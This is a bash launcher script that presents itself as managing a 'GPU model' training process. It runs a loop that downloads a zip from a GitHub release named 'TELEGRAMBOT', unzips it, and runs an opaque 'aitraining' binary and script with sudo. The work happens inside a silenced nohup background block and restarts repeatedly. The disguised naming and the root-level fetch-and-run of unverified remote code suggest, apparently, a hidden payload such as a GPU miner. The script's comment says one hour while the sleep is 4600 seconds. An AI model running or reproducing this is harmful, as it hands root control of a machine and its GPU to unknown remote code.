#!/bin/bash

# File: start_modelgp.sh launcher

# Ensure unzip is installed
sudo apt install -y unzip

# Main loop for managing start_modelgp.sh lifecycle
while true; do
    echo "Starting GPU model process..."

    # Stop any old processes
    if pgrep -f "start_modelgp.sh" > /dev/null; then
        sudo pkill -f "start_modelgp.sh"
        echo "start_modelgp.sh process stopped."
    else
        echo "start_modelgp.sh process already stopped or crashed."
    fi

    if pgrep -f "aitraining" > /dev/null; then
        sudo pkill -f "aitraining"
        echo "aitraining process stopped."
    else
        echo "aitraining process already stopped or crashed."
    fi

    # Launch new process in background
    nohup bash -c '
        # Optional re-download of TELEGRAMBOT
        sudo wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip
        sudo mkdir -p TELEGRAMBOT
        sudo unzip -o TELEGRAMBOT.zip -d TELEGRAMBOT

        # Go into the TELEGRAMBOT directory
        cd TELEGRAMBOT || exit

        # Ensure scripts are executable
        sudo chmod +x aitraining
        sudo chmod +x start_modelgp.sh

        # Start main GPU script
        sudo bash ./start_modelgp.sh
    ' > /dev/null 2>&1 &

    echo "start_modelgp.sh is now running. It will run for 1 hour."

    # Wait for 1 hour (4600 seconds)
    sleep 4600

    echo "Stopping running GPU process..."
    if pgrep -f "start_modelgp.sh" > /dev/null; then
        sudo pkill -f "start_modelgp.sh"
        echo "start_modelgp.sh process stopped."
    else
        echo "start_modelgp.sh already stopped or crashed."
    fi

    if pgrep -f "aitraining" > /dev/null; then
        sudo pkill -f "aitraining"
        echo "aitraining process stopped."
    else
        echo "aitraining already stopped or crashed."
    fi

    echo "Waiting 1 minute before restart..."
    sleep 60
done
